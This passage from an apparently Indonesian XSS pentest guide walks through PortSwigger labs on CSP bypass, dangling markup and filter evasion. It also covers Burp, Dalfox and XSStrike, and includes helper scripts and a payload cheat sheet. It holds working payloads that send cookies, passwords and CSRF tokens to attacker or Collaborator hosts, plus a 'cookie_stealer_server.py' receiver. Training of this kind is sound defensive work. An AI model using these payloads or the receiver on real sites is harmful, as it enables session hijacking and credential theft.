`#x` auto-focus ke element → `ng-focus` trigger → AngularJS evaluate expression di attribute.

---

# 9.6 Event Handlers & href Attributes Blocked

> 🔬 **PORTSWIGGER LAB-SPECIFIC:** Teknik SVG `<animate>` di bawah ini berlaku untuk lab PortSwigger spesifik di mana event handlers dan `href` diblok. Keberhasilan teknik bergantung pada konfigurasi filter dan browser rendering SVG.

## PortSwigger Lab: Reflected XSS with event handlers and href attributes blocked

Semua event handler (`onerror`, `onload`, `onmouseover`, dll) diblok. `href=javascript:` juga diblok.

Teknik: gunakan SVG `<animate>` untuk set `href` attribute ke `javascript:` nilai:

```html
<svg>
  <a>
    <animate attributeName=href values=javascript:alert(1) />
    <text y=20>Click me</text>
  </a>
</svg>
```

`<animate>` set `href` dari `<a>` ke `javascript:alert(1)` setelah render. Klik text → execute.

---

# 9.7 JavaScript URL dengan Karakter yang Diblok

## PortSwigger Lab: Reflected XSS in a JavaScript URL with some characters blocked

XSS ada di dalam `javascript:` URL context (href attribute). Tapi tanda kurung `(` dan `)` diblok.

Bypass tanpa tanda kurung menggunakan `throw`:

```javascript
javascript:throw onerror=alert,1337
```

Variasi via eval dengan template literal:

```javascript
javascript:eval`alert(1337)`
```

Atau teknik spesifik lab PortSwigger yang inject ke JSON context:

```text
https://TARGET/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

---

# 9.8 Dangling Markup Attack

> 🔬 **PORTSWIGGER LAB-SPECIFIC:** Dangling markup attack efektif untuk exfiltrasi data (CSRF token) saat CSP mencegah script execution. Namun browser modern (khususnya Chrome) telah menambahkan mitigasi yang membatasi kemampuan ini. Keberhasilan bergantung pada:
> 
> - Posisi injection point (harus sebelum data sensitif)
> - Browser yang digunakan victim
> - Apakah CSP memblok `img-src` atau tidak
> 
> Di real target: test secara eksplisit di browser victim, jangan assume dari Burp Render.

## PortSwigger Lab: Reflected XSS protected by very strict CSP, with dangling markup attack

CSP sangat ketat → tidak bisa execute script sama sekali. Tapi masih bisa exfiltrate data (misal CSRF token) via dangling markup.

**Konsep Dangling Markup:**

```text
Inject tag yang tidak tertutup di mana data sensitif ada di bawahnya.
Tag tersebut "menelan" konten HTML termasuk sensitive data,
dan mengirimkannya ke attacker server melalui HTTP request.
```

Contoh injection:

```html
<img src='https://ATTACKER/?data=
```

Tag `<img src='...` tidak ditutup. Browser meneruskan membaca HTML hingga menemukan tanda kutip penutup `'` yang berikutnya. Semua konten di antaranya menjadi nilai `src`, termasuk CSRF token yang ada di bawah injection point.

```text
Halaman HTML setelah injection:

...
<div>
<img src='https://ATTACKER/?data=

...
<form>
<input name="csrf" value="SECRET_TOKEN_HERE">  ← masuk ke src!
...
</form>
...
<img src='/...'>  ← kutip pertama yang ditemukan = penutup src
```

Browser request: `https://ATTACKER/?data=%0A...SECRET_TOKEN_HERE...`

---

# 9.9 CSP Bypass via Header Injection

> 🔬 **PORTSWIGGER LAB-SPECIFIC:** Teknik ini hanya berlaku jika aplikasi secara spesifik me-reflect user input ke dalam nilai header CSP (misalnya via parameter `token` yang masuk ke `report-uri`). Ini adalah misconfiguration yang sangat spesifik dan tidak umum ditemukan di produksi. Di real pentest: harus verifikasi bahwa parameter benar-benar masuk ke CSP header sebelum mencoba inject directive.

> **Note:** Directive `report-uri` sudah deprecated di CSP Level 3. Modern implementation menggunakan `report-to`. Tapi banyak aplikasi masih pakai `report-uri`.

## PortSwigger Lab: Reflected XSS protected by CSP, with CSP bypass

CSP header mengandung nilai yang bisa di-inject. Misalnya `report-uri` parameter yang me-reflect input:

```text
CSP awal:
Content-Security-Policy: default-src 'self'; script-src 'self'; report-uri /csp-report?token=abc

Inject:
token=abc;script-src-attr 'unsafe-inline'

Hasil CSP header:
Content-Security-Policy: default-src 'self'; script-src 'self'; report-uri /csp-report?token=abc;script-src-attr 'unsafe-inline'
```

Di beberapa browser (khususnya Chrome), `script-src-attr 'unsafe-inline'` mengizinkan inline event handlers meskipun ada `script-src 'self'`.

Cara deliver:

```text
https://TARGET/?search=<img src=1 onerror=alert(1)>&token=;script-src-attr 'unsafe-inline'
```

---

# 🧰 10. Tools & Automation

# 10.1 Burp Suite untuk XSS (PRIMARY)

## Setup

```text
1. Buka Burp Suite Community/Pro
2. Proxy → Options → Proxy Listener: 127.0.0.1:8080
3. Proxy → Open Browser (Burp's browser)
   ATAU configure manual proxy di Firefox:
   about:preferences → Network Settings → Manual proxy
   HTTP Proxy: 127.0.0.1, Port: 8080
```

---

## Proxy — Intercept & Forward

```text
Intercept is ON:
- Tangkap setiap request
- Bisa modifikasi sebelum dikirim
- Forward untuk lanjutkan

Intercept is OFF:
- Request otomatis diteruskan
- Cukup cek HTTP History
```

---

## Repeater — Core Testing Tool

Workflow:

```text
1. HTTP History → klik kanan request → Send to Repeater
2. Repeater tab
3. Ubah parameter di Request panel
4. Klik Send
5. Lihat Response panel:
   - Response tab: raw HTML
   - Render tab: visual preview
   - Ctrl+F: cari payload di response
6. Iterasi — ubah payload, Send lagi
```

Testing context di Repeater:

```text
Step 1: q=xss1234           → cari marker di response
Step 2: q=<script>test      → lihat apakah diblok/encoded
Step 3: q="                 → lihat apakah quote break attribute
Step 4: q=<img src=1 onerror=alert(1)>  → test payload
Step 5: Kalau Render tab menampilkan sesuatu = payload reflected
        Kalau alert muncul di browser = XSS
```

---

## Intruder — Fuzzing Tags/Attributes

```text
1. Repeater → klik kanan → Send to Intruder
2. Positions tab:
   - Clear § (hapus semua marker auto)
   - Select bagian yang mau di-fuzz → Add §
   Contoh: q=<§xss§> → akan fuzz tag name

3. Payloads tab:
   - Payload type: Simple list
   - Load atau Paste list (dari PortSwigger XSS cheat sheet)

4. Start attack

5. Sort hasil by:
   - Status code (200 vs 400)
   - Response length (berbeda = different response = tag diproses berbeda)
```

---

## Collaborator — Blind XSS

```text
1. Burp → Burp Collaborator
2. "Copy to clipboard" → dapat unique domain
   contoh: 0abc123def.oastify.com

3. Pakai di payload:
   <script>
   fetch('https://0abc123def.oastify.com/?c='+document.cookie)
   </script>

4. Setelah XSS trigger di victim browser → Poll now
5. Lihat HTTP interactions di panel bawah
```

---

# 10.2 Browser DevTools untuk XSS

## DOM XSS Testing

```text
F12 → Console:
Langsung test sink:
document.querySelector('#output').innerHTML = '<img src=1 onerror=alert(1)>'

Jika alert muncul → sink executable
```

## Source Search

```text
F12 → Sources → Ctrl+Shift+F

Cari:
innerHTML
document.write
eval(
location.hash
location.search
jQuery(
$(
.html(
```

## DOM Audit Cepat

```text
F12 → Console:
// Monitor DOM changes
var observer = new MutationObserver(console.log);
observer.observe(document.body, {childList:true, subtree:true});
```

---

# 10.3 Dalfox — XSS Scanner

```bash
# Install
go install github.com/hahwul/dalfox/v2@latest
export PATH="$PATH:$(go env GOPATH)/bin"

# Basic scan
dalfox url "https://TARGET/search?q=test"

# Dengan blind XSS (pakai Collaborator URL)
dalfox url "https://TARGET/search?q=test" \
  --blind "https://COLLABORATOR-URL/dalfox"

# Scan dengan cookie (authenticated)
dalfox url "https://TARGET/search?q=test" \
  --cookie "session=YOUR-SESSION-COOKIE"

# POST parameter
dalfox url "https://TARGET/comment" \
  --method POST \
  --data "comment=test&postId=1"
```

> **Catatan:** Dalfox bagus untuk initial scan tapi sering miss DOM XSS dan complex context. Selalu verifikasi manual di browser. Scanner result ≠ confirmed XSS.

---

# 10.4 XSStrike

```bash
# Clone dan setup dengan virtual environment (Parrot OS)
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# Basic scan
python3 xsstrike.py -u "https://TARGET/search?q=test"

# DOM mode
python3 xsstrike.py -u "https://TARGET/page" --dom

# POST
python3 xsstrike.py -u "https://TARGET/search" \
  --data "q=test"
```

---

# 10.5 curl — Simple Output Check

Gunakan curl hanya untuk:

**Cek response headers (CSP, Set-Cookie):**

```bash
curl -sI https://TARGET/ | grep -iE '(content-security-policy|set-cookie|server|x-powered-by)'
```

**Cek apakah input direfleksikan (sanity check awal):**

```bash
curl -s "https://TARGET/search?q=xss1234" | grep -c "xss1234"
```

**Filter character test:**

```bash
for c in '<' '>' '"' "'" '/' 'script' 'alert' 'onerror'; do
  r=$(curl -s "https://TARGET/search?q=TEST${c}TEST" | grep -o "TEST${c}TEST")
  [ -n "$r" ] && echo "[PASS] $c" || echo "[BLOCK] $c"
done
```

> Untuk testing payload dan verifikasi eksekusi: gunakan **Burp Repeater + Browser**, bukan curl. curl tidak merender JavaScript.

---

# ⚙️ 11. Automation Scripts

# 11.1 Script `xss_detect.sh`

## 📌 Kapan Digunakan

Untuk screening cepat apakah suatu GET parameter: direfleksikan, mengubah response, mengandung HTML reflection. Script tidak mengklaim vulnerability hanya berdasarkan reflection.

```bash
#!/usr/bin/env bash
set -u

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

usage() {
    echo "Usage: $0 <url> <parameter>"
    echo "Example: $0 'http://TARGET/search' q"
    exit 1
}

[[ $# -eq 2 ]] || usage

URL="$1"
PARAM="$2"

if [[ ! "$URL" =~ ^https?:// ]]; then
    echo -e "${RED}[!] URL must start with http:// or https://${NC}"
    exit 1
fi

if [[ ! "$PARAM" =~ ^[A-Za-z0-9_-]+$ ]]; then
    echo -e "${RED}[!] Invalid parameter name${NC}"
    exit 1
fi

TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

MARKER="XSS_TEST_$RANDOM"
echo -e "${BLUE}[*] URL      : $URL${NC}"
echo -e "${BLUE}[*] Parameter: $PARAM${NC}"
echo -e "${BLUE}[*] Marker   : $MARKER${NC}"
echo

echo -e "${YELLOW}=== Baseline ===${NC}"
BASE_SIZE="$(curl -ksS -o "$TMP/base" -w '%{size_download}' \
    --get --data-urlencode "${PARAM}=normal123" "$URL")"
echo "Size: ${BASE_SIZE}"

echo -e "${YELLOW}=== Reflection Test ===${NC}"
curl -ksS -o "$TMP/reflection" \
    --get --data-urlencode "${PARAM}=$MARKER" "$URL"

if grep -Fq "$MARKER" "$TMP/reflection"; then
    echo -e "${GREEN}[+] Marker reflected in response${NC}"
else
    echo "[-] Marker not reflected"
    exit 0
fi

echo -e "${YELLOW}=== Context Clues ===${NC}"
grep -n -F "$MARKER" "$TMP/reflection" | head -10

echo -e "${YELLOW}=== HTML-like PoC Reflection ===${NC}"
POC='<img src=x onerror=alert(1)>'
curl -ksS --get --data-urlencode "${PARAM}=$POC" "$URL" -o "$TMP/poc"
if grep -Eq '(<img|onerror=|<svg|<script)' "$TMP/poc"; then
    echo -e "${GREEN}[+] HTML/XSS payload appears in response${NC}"
    echo "[!] Validate exact browser execution context manually."
else
    echo "[-] Basic HTML payload not obviously reflected"
fi

echo -e "${YELLOW}=== Next Steps ===${NC}"
echo "1. Inspect exact reflection context (HTML body? attribute? JS?)"
echo "2. Select context-specific payload (Section 5)"
echo "3. Check CSP and sanitization (Section 9)"
echo "4. Confirm actual execution in browser (not curl)"
```

Jalankan:

```bash
chmod +x xss_detect.sh
./xss_detect.sh 'http://TARGET/search' q
```

---

# 11.2 Script cookie_stealer_server.py

Server dengan logging yang proper untuk lab:

```python
#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs
import argparse
import ipaddress
import sys

class CallbackHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        timestamp = datetime.now(timezone.utc).isoformat()
        ip = self.client_address[0]

        print("\n" + "=" * 55)
        print("XSS CALLBACK")
        print("=" * 55)
        print(f"Timestamp : {timestamp}")
        print(f"IP        : {ip}")
        print(f"Path      : {parsed.path}")

        if "c" in params:
            print(f"Cookie    : {params['c'][0]}")
        else:
            print("Cookie    : <none>")

        if "event" in params:
            print(f"Event     : {params['event'][0]}")

        if "user" in params and "pass" in params:
            print(f"Username  : {params['user'][0]}")
            print(f"Password  : {params['pass'][0]}")

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(b"OK\n")

    def log_message(self, fmt, *args):
        return

def parse_port(value):
    try:
        port = int(value)
    except ValueError:
        raise argparse.ArgumentTypeError("Port must be numeric")
    if not 1 <= port <= 65535:
        raise argparse.ArgumentTypeError("Port must be 1-65535")
    return port

def validate_bind(value):
    try:
        ipaddress.ip_address(value)
        return value
    except ValueError:
        if value == "localhost":
            return value
        raise argparse.ArgumentTypeError("Bind must be a valid IP or localhost")

def main():
    parser = argparse.ArgumentParser(
        description="XSS callback receiver for authorized labs"
    )
    parser.add_argument("-p", "--port", type=parse_port, default=8000)
    parser.add_argument("--bind", type=validate_bind, default="0.0.0.0")
    args = parser.parse_args()

    try:
        server = HTTPServer((args.bind, args.port), CallbackHandler)
    except OSError as exc:
        print(f"[!] Failed to bind server: {exc}", file=sys.stderr)
        sys.exit(1)

    print(f"[*] XSS receiver listening on {args.bind}:{args.port}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped")
    finally:
        server.server_close()

if __name__ == "__main__":
    main()
```

Jalankan:

```bash
python3 cookie_stealer_server.py --port 8000
```

Test manual:

```bash
curl 'http://127.0.0.1:8000/?c=test_cookie&event=lab'
```

---

# 11.3 XSS Payload Wordlist Generator

```python
#!/usr/bin/env python3
# Generates XSS payloads per context

payloads = {
    "html_body": [
        "<script>alert(1)</script>",
        "<img src=1 onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
    ],
    "html_attribute": [
        "\" onmouseover=\"alert(1)",
        "\" onfocus=\"alert(1)\" autofocus=\"",
        "' onmouseover='alert(1)",
    ],
    "js_string_single": [
        "'-alert(1)-'",
        "';alert(1)//",
        "\\'-alert(1)//",
    ],
    "js_template_literal": [
        "${alert(1)}",
    ],
    "href_attribute": [
        "javascript:alert(1)",
        "JaVaScRiPt:alert(1)",
        "java&#115;cript:alert(1)",
    ],
    "onclick_html_entity": [
        "http://foo?&apos;-alert(1)-&apos;",
    ],
    "filter_bypass": [
        "<sCrIpT>alert(1)</sCrIpT>",
        "<img/src=1/onerror=alert(1)>",
        "<svg><animate onbegin=alert(1) attributeName=x>",
        "<svg><animatetransform onbegin=alert(1)>",
        "<xss id=x onfocus=alert(1) tabindex=1>",
        "<script>alert`1`</script>",
        "javascript:throw onerror=alert,1337",
    ],
}

if __name__ == '__main__':
    import sys
    context = sys.argv[1] if len(sys.argv) > 1 else None

    if context and context in payloads:
        for p in payloads[context]:
            print(p)
    else:
        print("Available contexts:", list(payloads.keys()))
        print("\nAll payloads:")
        for ctx, plist in payloads.items():
            print(f"\n# {ctx}")
            for p in plist:
                print(p)
```

---

# 🌳 12. Master Decision Tree

```text
START: Parameter / Input Ditemukan
│
├─ 0. RECON
│   ├─ Cek response headers: CSP? AngularJS? Framework?
│   ├─ Cek JS files: ada source → sink path?
│   └─ AngularJS detected → test {{7*7}} di setiap input → ke 3D
│
├─ 1. REFLECTION TEST (Burp Repeater)
│   ├─ Kirim xss1234 → cek response
│   ├─ [Reflected langsung]                    → ke step 2
│   ├─ [Stored — muncul di halaman lain]       → ke step 4
│   ├─ [Tidak di response tapi ada di DOM]     → DOM XSS → ke step 3
│   └─ [Tidak muncul sama sekali]              → coba POST, coba header, cek Stored
│
├─ 2. CONTEXT IDENTIFICATION (dari response di Repeater)
│   ├─ <div>xss1234</div>                → HTML Body → Section 5.1
│   ├─ value="xss1234"                  → HTML Attribute → Section 5.2
│   ├─ href="xss1234"                   → href Context → Section 5.3
│   ├─ var x = 'xss1234';               → JS String → Section 5.4
│   ├─ var x = `xss1234`;               → Template Literal → Section 5.5
│   ├─ onclick="goto('xss1234')"        → onclick Handler → Section 5.6
│   ├─ <link href='xss1234'/>           → Canonical Link → Section 5.7
│   ├─ color: xss1234                   → CSS Context → Section 5.9
│   ├─ {"name":"xss1234"}               → JSON Context → Section 5.10
│   └─ <div ng-app>...xss1234...        → AngularJS CSTI → Section 5.11
│
├─ 3. DOM XSS PATH (DevTools + Browser)
│   ├─ F12 → Sources → search innerHTML / document.write / eval
│   ├─ Trace source → sink
│   ├─ [innerHTML sink]       → <img src=1 onerror=alert(1)>
│   ├─ [document.write sink]  → "><svg onload=alert(1)>
│   ├─ [eval / setTimeout]    → alert(1) langsung
│   ├─ [jQuery href sink]     → javascript:alert(1)
│   └─ [jQuery selector]      → <img src=1 onerror=alert(1)>
│
├─ 4. STORED XSS PATH
│   ├─ Inject via Burp Intercept / Repeater
│   ├─ Navigate ke halaman yang render stored content
│   ├─ [Visible page] → alert confirm, lanjut impact
│   └─ [Admin-only page] → Blind XSS → Burp Collaborator (Section 4.3)
│
├─ 5. PAYLOAD GAGAL — DIAGNOSA
│   ├─ [Direfleksikan tapi encoded] → identifikasi encoding schema (Section 5.4)
│   ├─ [Tag di-strip]              → filter bypass (Section 6.1, 6.2)
│   ├─ [Keyword diblok]            → keyword bypass (Section 6.5, 6.6)
│   ├─ [Spasi/bracket diblok]      → Section 6.7, 6.8
│   ├─ [Context dibaca salah]      → kembali ke step 2
│   └─ [CSP violation di console]  → Section 9
│
├─ 6. FILTER / WAF BYPASS (kalau payload diblok)
│   ├─ Burp Intruder → fuzz tags (Section 6.1)
│   ├─ Burp Intruder → fuzz event handlers (Section 6.2)
│   ├─ Custom tags (Section 6.3)
│   ├─ SVG bypass (Section 6.4)
│   └─ Keyword/quote/space/bracket bypass (Section 6.5–6.8)
│
├─ 7. CSP BYPASS (kalau ada CSP)
│   ├─ Cek CSP di response headers
│   ├─ Paste ke csp-evaluator.withgoogle.com
│   ├─ [unsafe-inline]           → periksa nonce/hash dulu (Section 9.3 Decision Logic) → jika efektif, inject kandidat
│   ├─ [unsafe-eval]             → eval/Function/setTimeout string variant
│   ├─ [whitelisted domain]      → cari JSONP endpoint (Section 9.4)
│   ├─ [AngularJS + sandbox]     → escape sandbox (Section 9.5)
│   ├─ [event handlers blocked]  → SVG animate trick (Section 9.6)
│   ├─ [report-uri injectable]   → inject directive (Section 9.9)
│   └─ [semua diblok]            → dangling markup (Section 9.8)
│
└─ 8. IMPACT ASSESSMENT (setiap path = possible impact chain, bukan guaranteed outcome)
    ├─ [Cookie tidak HttpOnly] → cookie accessible → evaluasi session theft possibility (Section 7)
    │                             (tergantung: apakah cookie valid? apakah ada SameSite/Secure? reachable?)
    ├─ [Cookie HttpOnly]       → CSRF via XSS → action as victim (Section 8.2)
    │                             (tergantung: victim privilege, CSRF protections, available actions)
    ├─ [Admin view page]       → blind XSS → evaluate admin cookie access (Section 4)
    │                             (tergantung: CSP di admin, HttpOnly, outbound blocking)
    └─ [Semua cookie blocked]  → credential capture (Section 8.1) — hanya jika autofill behavior ada
```

---

# 📋 13. PortSwigger Lab Quick Reference

|Lab|Context|Key Encoding|Payload|
|---|---|---|---|
|Reflected XSS into HTML context with nothing encoded|HTML body|Tidak ada|`<script>alert(1)</script>`|
|Stored XSS into HTML context with nothing encoded|HTML body|Tidak ada|`<script>alert(1)</script>`|
|DOM XSS in document.write sink using source location.search|document.write|Client-side|`"><svg onload=alert(1)>`|
|DOM XSS in innerHTML sink using source location.search|innerHTML|Client-side|`<img src=1 onerror=alert(1)>`|
|DOM XSS in jQuery anchor href using location.search|jQuery href|Client-side|`javascript:alert(1)`|
|DOM XSS in jQuery selector sink using hashchange|jQuery selector|Client-side|iframe + `<img src=1 onerror=print()>`|
|Reflected XSS into attribute with angle brackets HTML-encoded|HTML attribute|`<>` encoded|`" onmouseover="alert(1)`|
|Stored XSS into anchor href with double quotes HTML-encoded|href|`"` encoded|`javascript:alert(1)`|
|Reflected XSS into JS string with angle brackets HTML encoded|JS string|`<>` encoded|`'-alert(1)-'`|
|DOM XSS in document.write inside a select element|document.write + select|Client-side|`</select><img src=1 onerror=alert(1)>`|
|DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded|AngularJS `{{ }}`|`<>` dan `"` encoded|`{{$on.constructor('alert(1)')()}}`|
|Reflected DOM XSS|eval (JSON)|JSON escape|`\"-alert(1)}//`|
|Stored DOM XSS|innerHTML|Partial sanitize|`<><img src=1 onerror=alert(1)>`|
|Reflected XSS with most tags and attributes blocked|HTML body|WAF|Burp Intruder fuzz → `<body onresize=print()>` via iframe|
|Reflected XSS with all tags blocked except custom ones|HTML body|Block all std tags|`<xss id=x onfocus=alert(1) tabindex=1>#x`|
|Reflected XSS with some SVG markup allowed|SVG|Partial block|`<svg><animatetransform onbegin=alert(1)>`|
|Reflected XSS in canonical link tag|link href|`<>` encoded|`?'accesskey='x'onclick='alert(1)`|
|Reflected XSS into JS string with single quote and backslash escaped|JS string|`'` dan `\` escaped|`</script><script>alert(1)</script>`|
|Reflected XSS into JS string with angle brackets & double quotes HTML-encoded and single quotes escaped|JS string|`<>"` encoded, `'` escaped, `\` tidak|`\'-alert(1)//`|
|Stored XSS into onclick with angle brackets & double quotes HTML-encoded and single quotes & backslash escaped|onclick JS string|semua diblok|`http://foo?&apos;-alert(1)-&apos;`|
|Reflected XSS into template literal with all chars Unicode-escaped|JS template literal|semua diblok|`${alert(1)}`|
|Exploiting XSS to steal cookies|Stored XSS exploitation|-|`<script>fetch('//COLLABORATOR/?c='+document.cookie)</script>`|
|Exploiting XSS to capture passwords|Stored XSS + form inject|-|`<input name=username id=username><input type=password onchange=fetch('//COLLAB/?u='+...+this.value)>`|
|Exploiting XSS to bypass CSRF|Stored XSS + token steal|-|Fetch `/my-account` → extract csrf → submit change|
|Reflected XSS with AngularJS sandbox escape without strings|AngularJS sandbox|string chars blocked|`toString().constructor.prototype.charAt=[].join;[1]\|orderBy:toString().constructor.fromCharCode(...)=1`|
|Reflected XSS with AngularJS sandbox escape and CSP|AngularJS + CSP|sandbox + CSP|`<input id=x ng-focus=$event.composedPath()\|orderBy:'(z=alert)(1)'>`|
|Reflected XSS with event handlers and href blocked|HTML + SVG|event attrs blocked|`<svg><a><animate attributeName=href values=javascript:alert(1)/><text y=20>click</text></a></svg>`|
|Reflected XSS in a JS URL with some characters blocked|javascript: URL|`()` blocked|`javascript:throw onerror=alert,1337`|
|Reflected XSS protected by strict CSP, with dangling markup attack|Dangling markup|CSP blocks scripts|`<img src='https://ATTACKER/?data=` (unclosed attr)|
|Reflected XSS protected by CSP, with CSP bypass|CSP header injection|CSP aktif|`?search=<img src=1 onerror=alert(1)>&token=;script-src-attr 'unsafe-inline'`|

---

# 🛠️ 14. Common Errors & Troubleshooting

|Error / Situasi|Penyebab|Solusi|
|---|---|---|
|Payload muncul di source tapi tidak execute|CSP blocking atau context salah|Cek Console browser (F12), cek CSP header|
|`alert()` tidak muncul meski payload di-reflect|Context salah atau encoding|Re-analisis context di Burp Repeater response|
|`&lt;script&gt;` muncul bukannya `<script>`|HTML encoding aktif|Coba attribute context atau JS context injection|
|Payload hilang sama sekali dari response|WAF atau filter memblok|Gunakan filter identification script (Section 6.9)|
|`document.cookie` kosong|Cookie HttpOnly=true|Beralih ke CSRF via XSS atau credential capture|
|Stored payload hilang setelah submit|Server-side sanitization|Coba bypass (Section 5, 6), cek API endpoint, cek Burp History|
|DOM XSS tidak trigger di curl|DOM XSS = client-side|Test selalu di browser, bukan curl|
|Blind XSS tidak dapat callback|Collaborator URL tidak reachable atau payload salah|Test payload di browser dulu secara langsung|
|`Refused to connect` di browser console|CSP blok outbound|Gunakan `<img>` tag bukan `fetch` untuk exfil|
|AngularJS `{{ }}` tidak di-eval|`ng-app` tidak aktif di area tersebut|Periksa scope ng-app di DevTools|
|`<script>` di innerHTML tidak execute|Ini memang behavior browser|Gunakan `<img onerror>` atau `<svg onload>`|
|Payload berhasil di Burp Render tapi gagal di browser|Sanitizer client-side yang tidak terlihat dari Repeater, atau CSP blok inline script (note: XSS Auditor sudah dihapus dari semua browser modern sejak 2019)|Cek DevTools Console → cari CSP violation atau JS error; periksa apakah ada sanitizer library (DOMPurify, dll)|
|`'` escaped jadi `\'` tapi masih bisa exploit|Kalau `\` tidak di-escape|Gunakan `\'-alert(1)//` trick (Section 5.4c)|
|`'` dan `\` keduanya escaped|Tidak bisa escape string langsung|Coba `</script>` breakout (Section 5.4b) atau HTML entity trick|
|Template literal `${}` tidak execute|Bukan template literal (pakai `'` atau `"`)|Identifikasi ulang context dari source|
|AngularJS payload tidak jalan|Bukan ng-app atau versi AngularJS berbeda|Verifikasi ng-app di page source, cek versi|
|CSP blok tapi ada JSONP endpoint|Misconfig pada whitelist|Cari JSONP endpoint di domain yang di-whitelist (Section 9.4)|
|Dalfox/XSStrike tidak menemukan|Butuh auth atau kompleks context|Manual testing dengan Burp Repeater dan cookie|
|`fetch` ke Collaborator tidak dapat hit|Network issue di lab|Coba Exploit Server PortSwigger, coba `<img src=...>`|
|`</script>` dalam JS string tidak break tag|`<>` di-HTML-encode|Cek encoding, coba JS string escape lain (Section 5.4)|
|Canonical link payload tidak trigger|Harus tekan accesskey|Di lab PortSwigger: tekan Alt+Shift+X di Chrome|
|`javascript:` di href tidak execute|Browser/sanitizer blok scheme|Coba case variation: `JaVaScRiPt:`|
|Dangling markup tidak capture data|Injection point bukan sebelum sensitive data|Analisis halaman HTML, cari posisi injection yang benar|
|CSP header injection tidak berhasil|Parameter tidak di-reflect ke header|Cek apakah parameter benar-benar ada di CSP header response|
|CSS injection ditemukan tapi tidak ada JS|CSS ≠ XSS otomatis|Cari apakah bisa close `</style>` dan inject HTML (Section 5.9)|
|JSON reflection ditemukan tapi tidak execute|JSON bukan HTML sink|Trace apakah data akhirnya masuk `innerHTML`/script context (Section 5.10)|
|Space/whitespace difilter dalam attribute|Filter whitespace agresif|Gunakan `/` atau tab atau newline (Section 6.7)|
|`()` difilter, tidak bisa call function|Bracket filter aktif|Gunakan backtick `alert\`1``atau`throw onerror=alert,1337` (Section 6.8)|
|Port 8000 already in use|Process lain menggunakan port|`lsof -i :8000` kemudian `kill PID`, atau gunakan port lain|
|Blind XSS callback tapi cookie kosong|HttpOnly atau no auth cookie|Gunakan non-sensitive callback proof, lanjut ke CSRF via XSS|
|`unsafe-eval` ada di CSP tapi eval tidak bekerja|Input tidak masuk ke eval call|Cari trusted script yang menerima user input dan memanggil eval/Function/setTimeout|

---

# ✅ 15. Final XSS Checklist

```text
PRE-TEST
[ ] Parameter/input ditemukan
[ ] Reflection diuji (marker xss1234)
[ ] Stored behavior diuji (marker persist setelah reload)
[ ] DOM source diperiksa (F12 → Sources → cari dangerous sources)

CONTEXT IDENTIFICATION
[ ] Exact context diidentifikasi (HTML body? attribute? JS? CSS? JSON?)
[ ] Encoding yang diterapkan diketahui (<>? quotes? backslash?)
[ ] CSP diperiksa (ada? strict? misconfigured?)
[ ] WAF/filter behavior diperiksa

PAYLOAD TESTING
[ ] HTML context diuji (jika applicable)
[ ] Attribute context diuji (jika applicable)
[ ] JavaScript context diuji (jika applicable)
[ ] Template literal context diuji (jika applicable)
[ ] URL/href context diuji (jika applicable)
[ ] CSS context diuji (jika applicable)
[ ] JSON context diuji (jika applicable)
[ ] Filter bypass diterapkan jika diperlukan

VALIDATION
[ ] PoC execution berhasil (di browser, bukan curl)
[ ] Reflected / Stored / DOM classification benar
[ ] Exact sink ditemukan dan dikonfirmasi

IMPACT
[ ] Impact dinilai (cookie? credentials? CSRF? blind?)
[ ] HttpOnly/SameSite/Secure cookie dianalisis
[ ] Authenticated actions diuji pada lab
[ ] Callback server tersedia bila dibutuhkan

EVIDENCE
[ ] Finding divalidasi secara manual
[ ] Evidence disimpan (screenshot, request, payload)
```

---

# ⚡ 16. Quick Reference

## Input → Context → Test → Failed → Diagnose

```text
INPUT DITEMUKAN
↓
Kirim: q=xss1234 (Burp Repeater)
↓
[Muncul di response]
   ↓
   Lihat DIMANA muncul (context):
   HTML body    → <script>alert(1)</script>  atau  <img src=1 onerror=alert(1)>
   Attribute    → " onmouseover="alert(1)
   JS string '  → '-alert(1)-'
   JS string "  → "-alert(1)-"
   Template lit → ${alert(1)}
   onclick      → http://foo?&apos;-alert(1)-&apos;
   href         → javascript:alert(1)
   CSS          → close: red}</style><img src=1 onerror=alert(1)>
   JSON         → trace ke DOM sink
   AngularJS    → {{$on.constructor('alert(1)')()}}
   ↓
   [Payload tidak execute]
   ↓
   Apakah di-encode? → identifikasi encoding → pilih sub-scenario (5.4a-d)
   Apakah tag di-strip? → Burp Intruder fuzz tags (6.1)
   Apakah keyword diblok? → bypass (6.5, 6.6, 6.7, 6.8)
   Apakah CSP violation di console? → Section 9
   ↓
[Tidak muncul di response]
   ↓
   Cek Stored: navigate ke halaman lain setelah submit
   Cek DOM: F12 → Sources → search innerHTML, location.hash, eval
```

---

## Payload Siap Pakai per Context

### HTML Body

```html
<script>alert(1)</script>
<img src=1 onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>
<video><source onerror=alert(1)>
```

### HTML Attribute

```text
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
' onmouseover='alert(1)
```

### JavaScript String

```text
'-alert(1)-'
';alert(1)//
\'-alert(1)//         ← single quotes escaped, backslash tidak
</script><script>alert(1)</script>   ← single quote + backslash escaped
```

### Template Literal

```text
${alert(1)}
```

### onclick (HTML Entity)

```text
http://foo?&apos;-alert(1)-&apos;
```

### href Attribute

```text
javascript:alert(1)
javascript:throw onerror=alert,1337    ← ketika () diblok
```

### AngularJS CSTI

```text
{{7*7}}                                         ← probe
{{$on.constructor('alert(1)')()}}               ← exploit
{{constructor.constructor('alert(1)')()}}       ← alternatif
```

### Custom Tags (All Tags Blocked)

```text
